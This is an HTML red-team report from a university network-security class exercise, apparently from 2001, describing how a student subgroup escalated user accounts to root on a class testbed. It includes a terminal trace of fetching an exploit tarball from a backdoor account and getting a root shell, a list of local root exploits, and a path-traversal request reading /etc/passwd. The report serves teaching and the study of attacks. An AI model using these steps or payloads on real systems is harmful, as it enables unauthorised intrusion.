@@ -1,0 +1,634 @@
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <title>CS 290I Network Security and Intrusion Detection - Red Team Report</title>
+</head>
+<body>
+
+<h1>Red Team Report<img SRC="logoxmen.jpg" HSPACE=30  align=RIGHT></h1>
+
+<h2>Red Team/ Escalation Group (Xploit men)</h2>
+
+<p><br>Description: The group gained root privileges given a user account on
+any of the machines.
+
+<p>Members:
+<br>
+<table BORDER COLS=4 WIDTH="100%" NOSAVE >
+<tr>
+<td><b>Name</b></td>
+
+<td><b>E-mail</b></td>
+
+<td><b>Testbed Handle</b></td>
+
+<td><b>Remarks</b></td>
+</tr>
+
+<tr>
+<td>Josep Blanquer&nbsp;</td>
+
+<td>blanquer@cs.ucsb.edu</td>
+
+<td>condor</td>
+
+<td>Group Leader</td>
+</tr>
+
+<tr>
+<td>Vishal Mittal&nbsp;</td>
+
+<td>vishal@cs.ucsb.edu</td>
+
+<td>cowboy&nbsp;</td>
+
+<td></td>
+</tr>
+
+<tr>
+<td>Yogeshwar Shenoy</td>
+
+<td>ynshenoy@cs.ucsb.edu</td>
+
+<td>phantom&nbsp;</td>
+
+<td></td>
+</tr>
+
+<tr>
+<td>Nitesh Saxena</td>
+
+<td>nitesh@cs.ucsb.edu&nbsp;</td>
+
+<td>bytewiz&nbsp;</td>
+
+<td></td>
+</tr>
+
+<tr>
+<td>Vivek Prasad</td>
+
+<td>vivek@cs.ucsb.edu</td>
+
+<td>sphinx&nbsp;</td>
+
+<td></td>
+</tr>
+
+<tr>
+<td>Yuan Sun</td>
+
+<td>suny@cs.ucsb.edu</td>
+
+<td>venisa</td>
+
+<td></td>
+</tr>
+
+<tr>
+<td>Yingjun Piao</td>
+
+<td>yjpark@cs.ucsb.edu</td>
+
+<td>fender</td>
+
+<td></td>
+</tr>
+</table>
+
+<h2>
+Mission</h2>
+This sub-group of the red team was responsible for escalation to root after
+they had been given a user account on the attacked machine. The group before
+this (vulnerability exploit) was responsible for providing us with a user
+account. We were then supposed to run the exploits we had and get a shell
+with root privileges which we used to execute the next group's scripts
+for flag acquisition.
+<p>&nbsp; The splitting of the work was thought to be even among the group
+members. Each member of the group found at least one or two working exploits
+from the ones that were collected, documented them, built the script to
+execute them and wrote part of the documentation. Some members tried extra
+things such as password cracking, or exploits for other non-Linux maxhines.
+The group leader had some extra tasks apart from the normal member responsabilities,
+and wants to state that everybody responded promptly and pretty efficiently
+on the tasks that were assigned. Everybody helped in the excercise execution.
+<p>&nbsp; Here's a more detailed description of each of the members:
+<p>Nitesh Saxena: During the preparation of the exercise, I found out a
+local root exploit called dump-0.4b15x.c which exploits a bug in dump files
+for Red Hat 6.20, thus giving root. I tested it on all the machines on
+the testbed and it gave root every time I tried it. I then wrote a shell
+script to automate the execution of the file with different options alongwith
+a README file so that every member of the subgroup understands how the
+file works. I also found a root exploit for Red Hat 7.0 called LPRng-3.6.24-1.c
+and tested it on my machine at home. During the actual exercise, I won't
+say that I did much as Joseph (our subgroup leader) was doing most of the
+things. Though, I ran our script to crack root on two of the machines.
+I also tried to find the flag on godard manually as the perl script to
+find the flag failed (because PERL was not installed on that machine).
+I couldn't find it because it wasn't there.
+<p>Yogeshwar Shenoy: During the preparation phase, I found two exploits
+for RedHat Linux 6.2-restore.sh which is a local root exploit and statdx.c
+which is a remote root exploit. When the Solaris box became available I
+found&nbsp; two local root exploits - ufsrestore.c and netprex.c. I wrote
+scripts to run the exploits so that they could be called from within a
+metascript. I also downloaded and used John the Ripper, a password cracking
+program, in case we needed it on the day of the exercise. But we were not
+called upon to crack passwords. Since we had a meta script that automated
+everything, during the actual exercise, all I had to do was run the script
+on some of the machines on which we had to escalate to root privileges.
+We successfully got root on godard, but there was no secret.txt file there.
+<p>Vivek Prasad: I have downloaded many programs from the net and had them
+tested on the testbed-work that could give us root account.&nbsp; Not all
+the programs worked on our test-bed.&nbsp; Few of the attacks like xperl.sh
+worked and I prepared the corresponding shell script for automating the
+attack and README document files.&nbsp; I mainly concentrated on collecting
+attacks that worked on RedHat Linux 6.2.&nbsp; On the actual exercise day,
+after I got the password for one of the user account from one of the group
+below us , I ran our
+<br>escalation script (in a roundabout way - ftp services were down) and
+got the root privilege on machine godard.&nbsp; Since there was no perl
+installed, our flag acquisition script could'nt work.&nbsp; Therefore I
+first did chown to change the owner of all files to root and then recursively
+searched for the secret.txt file using find and ls -aR.&nbsp; However,
+there was no secret.txt file stored on that machine.
+<p>Vishal Mittal: I searched the web for various expoits for Solaris and
+Linux. Tried and tested them on the testbed. A few worked and a few did
+not. The ones that worked, i prepared a script for compiling and executing
+them and a readme file that explained the exploit, the OS and the machines
+it worked on and other specific details. Added all these to the repository.
+<p>Yuan Sun : found some exploits on RedHat, atsadc.c ,glibc.c, Modutils,
+sysctl_exp.c, and libc-language-su.c. one of them works well on testbed:libc-language-su.c,
+and then wrote script and readme files for it, and&nbsp; wrote the preparation
+part and reference part of the group report. Also helped in the execution
+of the exercise.
+<p>Yingjun Piao : found some exploits on RedHat and Solaris,Screen 3.7.6,
+netprex,sendmail,su, and restore-cool.sh, restore-cool.sh works well on
+testbed. wrote script and readme files for it, and&nbsp; wrote the preparation
+and reference parts of the group report, helped in the execution of the
+exercise.
+<p>Josep M. - Synchronize&nbsp; everybody's tasks and plot the plan of
+attack for the group. Create the common repository.&nbsp; Search and&nbsp;
+test several exploits. Built the automated metascript. Provide help/synchronization
+with the adjacent groups.Written the execution part of the report. Merge/rewrite
+the final version of&nbsp; the group&nbsp; report.
+<h2>
+Preparation</h2>
+Each member in the group had the initial task of collecting exploits, study
+them, understand them and then run them on the testbed to see if they worked.
+Some of them were based on buffer overflows so they had to be tested with
+various offsets to see with which ones did they work with.
+<p>&nbsp;Once we had several working exploits in our repository, we split
+them and each member provided:
+<ul>
+<li>
+a script to run the exploit, which included any kind of compilation, tool
+checking and offset testing ,which returned a non-zero value in the case
+of failure or a root shell otherwise. Some solaris exploits were to be
+pre-compiled for the appropriate architecture since no gcc was available
+on the target machine.</li>
+
+<li>
+a readme file to highlight the uniqueness of the exploit, like the vulnerability
+that it exploited, the machine and the OS that it was meant for and any
+other specific details under which it worked or it failed.</li>
+</ul>
+Thus we built up a common repository repository of exploits each with the
+source, binary, readme and the script.&nbsp; The repository was also used
+as a synchronization tool to avoid more than one people to work on the
+same exploits, optimizing their search.
+<p>&nbsp;A metascript was also built, which was able to automatically detect
+the type of operating system and systematically try the available matching
+exploits for it. The script used the non-zero returned values to keep trying
+more scripts in the list.
+<p>&nbsp; The result of building such&nbsp; repository of documented exploits
+with their own individual scripts along with the metascript, allowed our
+group to completely automate the break-in process given a user shell.
+<p>Some team members tried password cracking (using John the Ripper) so
+our team could try to break into a machine which couldn't be compromised
+by the remote exploits team. This actually turned up to be very effective
+on the solaris machine (see execution).
+<p>&nbsp; Another important task was the communication/synchronization
+with the other groups:
+<p>&nbsp; Our interface to the previous group was very simple: We would
+provide them with a tar file which contained all the necessary scripts
+and binary programs to carry out escalation to root privileges plus the
+flag acquisition. To automate the process, the remote vulnerabilities team
+only had to transfer the file into the user account broken into and type:
+<p>&nbsp;&nbsp; tar xf XMEN.tar ;&nbsp; ./escalate.sh
+<p>The interface to the group for flag acquisition provided us with a perl
+script which had to be run with root privileges. Our escalate shell script
+would present a root shell in which the only manual intervention needed
+was to type "../flag.pl" in order to trigger the flag acquisition program.
+We didn't think that modifying our eggshells to automatically run the flag
+script was necessary.
+<br>&nbsp;
+<h2>
+Execution</h2>
+&nbsp; Since the remote exploits of the group before us were able to get
+root privileges directly on the linux RedHat6.2 boxes, our scripts were
+not needed in those situations. However, since there were no remote exploits
+for solaris, we used one of the cracked passwords from one of the linux
+machines to log in to goddard (the solaris box). Once there with user privileges,
+we needed to get our tar file with our exploits. Since the solaris machine
+was "bare-bones" installed, we couldn't use scp, rcp utilities, and we
+of course didn't want to retrieve the file from our cs accounts with ftp
+(password in the clear with half the other class sniffing the network).
+Since the machines we had prepared for the attack didn't have the ftpd
+setup either, we decided to retrieve our scripts through one of the back
+door users in the already broken into linux machine (in that case doesn't
+matter to expose the password with ftp ).
+<p>&nbsp;Once we had our exploits, we just ran: tar xf XMEN.tar; ./escalate.sh
+and we immediately got a root shell.
+<p>&nbsp;Then we tried to execute the flag acquisition program but the
+machine didn't have perl installed, so we had to manually search for the
+flag. That machine didn't have any flag file. A remotely mounted nfs directory
+from leone (which was down) complicated a bit the search since it was mounted
+with&nbsp; the"hard" option and it was not even possible to unmount it.
+<p>&nbsp; Here's one of the traces of the attack to the solaris machine:
+<pre><font size=-2>Script started on Tue Mar 13 14:02:48 2001</font></pre>
+
+<pre><font size=-2>$ ftp 128.111.54.157</font></pre>
+
+<pre><font size=-2>Connected to 128.111.54.157.</font></pre>
+
+<pre><font size=-2>220 altman.cs.ucsb.edu FTP server (Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 2000) ready.</font></pre>
+
+<pre><font size=-2>Name (128.111.54.157:zhoupin): bdu</font></pre>
+
+<pre><font size=-2>331 Password required for bdu.</font></pre>
+
+<pre><font size=-2>Password:</font></pre>
+
+<pre><font size=-2>230 User bdu logged in.</font></pre>
+
+<pre><font size=-2>ftp> cd /temp</font></pre>
+
+<pre><font size=-2>250 CWD command successful.</font></pre>
+
+<pre><font size=-2>ftp> dir</font></pre>
+
+<pre><font size=-2>200 PORT command successful.</font></pre>
+
+<pre><font size=-2>150 Opening ASCII mode data connection for /bin/ls.</font></pre>
+
+<pre><font size=-2>total 116</font></pre>
+
+<pre><font size=-2>-rw-r--r--&nbsp;&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 112640 Mar 13 14:10 XMEN.tar</font></pre>
+
+<pre><font size=-2>226 Transfer complete.</font></pre>
+
+<pre><font size=-2>77 bytes received in 0.02 seconds (3.79 Kbytes/s)</font></pre>
+
+<pre><font size=-2>ftp> bin</font></pre>
+
+<pre><font size=-2>200 Type set to I.</font></pre>
+
+<pre><font size=-2>ftp> get XMEN.tar</font></pre>
+
+<pre><font size=-2>200 PORT command successful.</font></pre>
+
+<pre><font size=-2>150 Opening BINARY mode data connection for XMEN.tar (112640 bytes).</font></pre>
+
+<pre><font size=-2>226 Transfer complete.</font></pre>
+
+<pre><font size=-2>local: XMEN.tar remote: XMEN.tar</font></pre>
+
+<pre><font size=-2>112640 bytes received in 0.087 seconds (1263.22 Kbytes/s)</font></pre>
+
+<pre><font size=-2>ftp> quit</font></pre>
+
+<pre><font size=-2>221-You have transferred 112640 bytes in 1 files.</font></pre>
+
+<pre><font size=-2>221-Total traffic for this session was 113589 bytes in 4 transfers.</font></pre>
+
+<pre><font size=-2>221-Thank you for using the FTP service on altman.cs.ucsb.edu.</font></pre>
+
+<pre><font size=-2>221 Goodbye.</font></pre>
+
+<pre><font size=-2>$ ls</font></pre>
+
+<pre><font size=-2>GOOD.xmen&nbsp; OUTPUT&nbsp;&nbsp;&nbsp;&nbsp; XMEN.tar</font></pre>
+
+<pre><font size=-2>$ tar xf XMEN.tar</font></pre>
+
+<pre><font size=-2>$ ./escalate.sh</font></pre>
+
+<pre><font size=-2>Using Solaris Platform Exploits...</font></pre>
+
+<pre><font size=-2>##############Trying netprex exploit:</font></pre>
+
+<pre><font size=-2>%sp 0xffbef7b0 offset 1600 --> return address 0xffbefdf0 [1]</font></pre>
+
+<pre><font size=-2># ../flag.pl</font></pre>
+
+<pre><font size=-2>./flag.sh: perl not found</font></pre>
+
+<pre><font size=-2># find / -name secret.txt -print | tee FILES</font></pre>
+
+<pre><font size=-2>NFS server leone not responding still trying</font></pre>
+
+<pre><font size=-2>...</font></pre>
+
+<pre><font size=-2>#</font></pre>
+
+<h2>
+Evaluation</h2>
+How well the subgroup accomplished its mission:
+<p>Our scripts were supposed to be automatically executed from the team
+before us. Since the group could get root privileges remotely they didn't
+have the need to execute our escalation. Our automated scripts we were
+able to <i>always </i>break in&nbsp; any of the test-bed machines before
+the excercise. So our overall evaluation is that our work was <i>solid</i>
+and <i>consistent</i>.
+<p>However,&nbsp; since the remote vulnerability group concentrated in
+the linux boxes (the only official targets), we could successfully test
+our automated scripts in a solaris machine. We got user acces from a cracked
+password in one of the linux machines. Again, our script showed to be consistently
+working for solaris.
+<p>How well the subgroup executed the plan of attack:
+<p>Our subgroup was successful in finding exploits that gave root access.
+We had eight working local working exploits, six of these were for RedHat
+6.2 and two for Solaris. In addition to this, we had two remote root exploits
+as well, which we didn't use to avoid overlap with another group.
+<p>A description of what could have been done better:
+<p>We focussed mainly on only two platforms, namely Red Hat 6.20 (some
+7.0) and Solaris.
+<br>We could have also done some home work for Windows NT.
+<br>Finally, to completely automate the process, we could have changed
+the root shells on the eggs, or changed the program to "setuid", in order
+to execute the flag acquisition script without needing to type "../flag.sh".
+That was a considerable amount of work compared to the amount of typing
+overhead (just 4-6 machines).
+<p>How well the subgroup interacted with any adjacent subgroups:
+<p>&nbsp; As explained before, we designed the interfaces with the other
+groups to be very simple and provide automatic execution.
+<p>&nbsp; We provided a tar file (XMEN.tar) to the group before us which
+only needed to be untarred and execute "./escalate".
+<p>&nbsp; Our tar file always contained the flag acquisition program (we
+received from the group after us) which was manually executed after a successful
+exploit.
+<p>The tools that were available for performing the subgroup's mission:
+<p>A number of exploits are available on the Internet for escalating user
+access to privileges. But only a few of them actually worked as claimed.
+We found it difficult to read the exploit code and try and figure out why
+a particular exploit wouldn't work. This was so because the exploit code
+available on the Internet is not really well documented. Comments and/or
+readme files that explained the nature of the bug and how the author of
+code was attempting to exploit it would have helped.
+<p>In some other cases, the vulnerability had simply been patched though
+the author of the exploit claimed that they worked.&nbsp; Eg. mogrify is
+a program that contains a buffer overflow. The exploit code available for
+this claimed to work even on RedHat 7.0 But we found (both on the test
+bed and on a RH 7 box) that the executable is not setuid root. (It was
+not much fun, getting our own shell).
+<p>Of the password cracking tools available on the Internet, we were successful
+in using John the Ripper on the testbed. We made sure we were able to run
+this tool on a Linux box just in case we needed to do some password cracking
+on the day of the exercise. (No we did not expect the root password to
+be easily crackable, but thought it could be useful since many users could
+share passwords accross machines). We think that this is pretty neat tool,
+because we had no difficulty in getting this to work.
+<p>An evaluation of the exercise itself:
+<p>The exercise helped in understanding how easy a network can be compromised
+by malicious hackers using freely available tools. This is an important
+first step in being able to "secure" a network against attacks. Another
+of the learned things is that fully automating these kind of attacks are
+not easy, let alone doing it in a "stealth" mode.
+<p>Probably and improvement for the excercise would be to give everybody
+the opportunity to be in both teams (i.e two rounds) so they can get the
+experience from both sides. However, with a class this size(60+?) and a
+quarter only so long(10 little weeks) this is might not be within limits
+of possibility.
+<h2>
+Miscellaneous</h2>
+This is a non-exhaustive list of the most important exploits we found and
+tested in the preparation phase:
+<br>&nbsp;
+<table BORDER COLS=4 WIDTH="100%" NOSAVE >
+<tr>
+<td><b>Name</b></td>
+
+<td><b>Source</b></td>
+
+<td><b>OS/Platform</b></td>
+
+<td><b>Successful</b></td>
+</tr>
+
+<tr>
+<td>dump-0.4b15x&nbsp;</td>
+
+<td>securityfocus.com&nbsp;</td>
+
+<td>RedHat(6.2)&nbsp;</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>su-exp.c&nbsp;</td>
+
+<td>securityfocus.com&nbsp;</td>
+
+<td>RedHat(6.2)&nbsp;</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>wuftpd-god.c&nbsp;</td>
+
+<td>securityfocus.com&nbsp;</td>
+
+<td>RedHat(6.2)&nbsp;</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>xperl.sh&nbsp;</td>
+
+<td>securityfocus.com&nbsp;</td>
+
+<td>RedHat(6.2)&nbsp;</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>statdx.c &amp; statdx2.c</td>
+
+<td>www.securityportal.com&nbsp;</td>
+
+<td>RedHat(6.2)&nbsp;</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>restore-cool.sh&nbsp;</td>
+
+<td></td>
+
+<td>RedHat(6.2)&nbsp;</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>libc-language-su.c</td>
+
+<td></td>
+
+<td>RedHat(6.2)&nbsp;</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>ufsrestore.c&nbsp;</td>
+
+<td>www.rootshell.com</td>
+
+<td>Solaris</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>netprex.c</td>
+
+<td>SecuriTeam.com</td>
+
+<td>Solaris 2.6 and 7 (SPARC)&nbsp;</td>
+
+<td>Yes</td>
+</tr>
+
+<tr>
+<td>atsadc.c</td>
+
+<td>SecuriTeam.com</td>
+
+<td>RedHat 6.1&nbsp;</td>
+
+<td>No</td>
+</tr>
+
+<tr>
+<td>glibc.c&nbsp;</td>
+
+<td>www.rootshell.com&nbsp;</td>
+
+<td></td>
+
+<td>No</td>
+</tr>
+
+<tr>
+<td>Modutils</td>
+
+<td>SecuriTeam.com</td>
+
+<td>RedHat 7.0/SuSE 7.0</td>
+
+<td>No</td>
+</tr>
+
+<tr>
+<td>Screen 3.7.6&nbsp;</td>
+
+<td>SecuriTeam.com</td>
+
+<td></td>
+
+<td>No</td>
+</tr>
+
+<tr>
+<td>sendmail</td>
+
+<td>SecuriTeam.com</td>
+
+<td>Linux</td>
+
+<td>No</td>
+</tr>
+
+<tr>
+<td>su</td>
+
+<td>SecuriTeam.com</td>
+
+<td></td>
+
+<td>No</td>
+</tr>
+
+<tr>
+<td>sysctl_exp.c</td>
+
+<td></td>
+
+<td>Linux</td>
+
+<td>No</td>
+</tr>
+</table>
+
+<h2>
+References</h2>
+[1] http://securityfocus.com
+<br>[2] http://www.rootshell.com
+<br>[3] http://SecuriTeam.com
+<br>[4] http://www.securityportal.com
+<br>[5] http://www.openwall.com/john/
+<br>[6] man sh&nbsp; ;-)
+<br>&nbsp;
+
+<h2>Addendum</h2>
+<pre>
+sadmindex.c 
+   It is a kind of buffer overflow to the sadmind server program. Under vulnerable
+ versions of sadmind (2.6 and 7.0 have been tested), if a long buffer is passed
+ to a NETMGT_PROC_SERVICE request (called via
+clnt_call()), it is possible to overwrite the stack pointer and execute
+arbitrary code.  The actual buffer in questions appears to hold the client's
+domain name.  The overflow in sadmind takes place in the amsl_verify()
+function.  Because sadmind runs as root any code launched as a result will
+run as with root privileges, therefore resulting in a root compromise. Because the RPC
+is always timeout, it didn't break into the system at the practic time.
+
+amountdexp.c
+  It is a remote buffer overflow for automount server program.Remote Solaris
+2.5, 2.5.1 stock, 2.5.1 patched, 2.6, 2.7 rpc.statd/automountd exploit. User
+can excute some arbitrary code. I tried this, the result on the clinet side
+seems everything is OK, but I didn't get the control of the Shell.
+ 
+urdls.c
+ (alphanumeric) unreadable directory lister. 
+ For listing files in directories without having permission to do so.  
+ this program goes in a round-up (with 09-AZ-az) fashion, so it supports  
+ start and stop points. (argument 3). It is successful tested on the testbed.
+ But it requirs a local account first, and it is not efficient.
+
+ns-shtml.pl
+  Remote sploit for Netscape Enterprise Server 4.0/sparc/SunOS 5.7. Did not
+work, because there is no perl in godard.
+   
+netprex.c -
+ SPARC Solaris root exploit for /usr/lib/lp/bin/netpr
+ When the exploit is run, the host specified with the -h option will
+ receive a connection from the netpr program to a nonsense printer name, but
+  the host will be otherwise untouched.
+  
+PSuser.c
+ SPARC Solaris exploit to remote get the file.
+ redirct the errPagePath to a file.
+ Like:
+  "GET /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd\n";
+
+</pre>
+
+</body>
+</html>
